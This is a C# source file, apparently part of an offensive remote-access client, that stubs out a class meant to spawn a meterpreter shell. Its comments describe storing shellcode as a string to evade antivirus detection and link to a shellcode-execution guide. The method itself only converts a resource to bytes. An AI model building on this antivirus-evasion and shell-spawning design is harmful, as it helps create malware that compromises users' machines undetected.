using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /// <summary>
    /// A class that spawns a meterpreter shell on a separate process.
    /// </summary>
    public static class Shell
    {
        /// It's necessary to put the ShellCode in string to prevent AV detection.
        /// To generate one, see: https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c
        /// Currently disabled because AntiVirus detects
        public async static void Start(int procid = 0)
        {
            await Task.Run(() => {
                // try and catch bc this is not stable
                try {
                    var bytes = Utilities.Converter.StringToByteArray(Properties.Resources.ShellCode);
                }
                catch { 
                
                }
            });
        }
    }
}
